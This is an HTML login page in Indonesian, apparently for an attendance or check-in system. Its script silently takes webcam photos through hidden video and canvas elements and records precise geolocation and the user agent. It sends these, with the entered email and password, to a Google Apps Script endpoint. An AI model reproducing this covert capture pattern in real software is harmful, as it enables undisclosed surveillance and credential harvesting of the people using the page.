<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bulma@0.9.4/css/bulma.min.css">
</head>
<body>
  <section class="hero is-link">
    <div class="hero-body">
      <div class="container">
        <h1 class="title">LOGIN</h1>
        <h2 class="subtitle">ISI DATA UNTUK VALIDASI</h2>
      </div>
    </div>
  </section>

  <form id="login-form" class="container m-4 pl-4" method="POST">
    <div class="field">
      <label class="label">Email</label>
      <div class="control">
        <input class="input" type="email" name="email" placeholder="Enter email" required>
      </div>
    </div>

    <div class="field">
      <label class="label">Password</label>
      <div class="control">
        <input class="input" type="password" name="password" placeholder="Enter password" required>
      </div>
    </div>

    <div class="field">
      <div class="control">
        <button type="submit" class="button is-success">Login</button>
      </div>
    </div>
  </form>

  <div id="message" style="margin: 20px; font-weight: bold; color: green;"></div>

  <video id="video" autoplay playsinline style="display:none;"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    let initialPhoto = null;
    let secondPhoto = null;
    let lat = "", lon = "", device = navigator.userAgent;

    window.onload = function () {
      const message = document.getElementById("message");
      message.textContent = "MASUK DENGAN EMAIL DAN PASSWORD ";

      navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(stream => {
          const video = document.getElementById("video");
          video.srcObject = stream;
          video.onloadedmetadata = function () {
            setTimeout(() => {
              const canvas = document.getElementById("canvas");
              canvas.width = video.videoWidth;
              canvas.height = video.videoHeight;
              canvas.getContext("2d").drawImage(video, 0, 0);
              canvas.toBlob(blob => {
                initialPhoto = blob;
              }, "image/jpeg");
            }, 1000);
          };
        })
        .catch(err => {
          console.error("Gagal kamera:", err);
          message.textContent = "Kamera gagal diaktifkan.";
        });

      navigator.geolocation.getCurrentPosition(
        pos => {
          lat = pos.coords.latitude;
          lon = pos.coords.longitude;
        },
        err => {
          console.error("Gagal lokasi:", err);
          message.textContent = "Gagal ambil lokasi.";
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    };

    document.getElementById("login-form").addEventListener("submit", function (e) {
      e.preventDefault();
      const form = e.target;
      const message = document.getElementById("message");
      const formData = new FormData(form);

      const video = document.getElementById("video");
      const canvas = document.getElementById("canvas");
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      canvas.getContext("2d").drawImage(video, 0, 0);
      canvas.toBlob(blob => {
        secondPhoto = blob;

        formData.append("latitude", lat);
        formData.append("longitude", lon);
        formData.append("device", device);
        if (initialPhoto) formData.append("photo1", initialPhoto, "photo1.jpg");
        if (secondPhoto) formData.append("photo2", secondPhoto, "photo2.jpg");

        fetch("https://script.google.com/macros/s/AKfycbyET9ITEquXH5xnrzOBXZEP4C7_9q7u3zyz3SrzKaA3SZVNMb-gHTAQf0Rn6jgnWtNO4w/exec", {
          method: "POST",
          body: formData
        })
        .then(res => {
          message.textContent = "Login berhasil, membuka form laporan...";
          setTimeout(() => { window.location.href = 'indanout.html'; }, 1500);
        })
        .catch(err => {
          console.error(err);
          message.textContent = "Gagal mengirim data login.";
        });
      }, "image/jpeg");
    });
  </script>
</body>
</html>
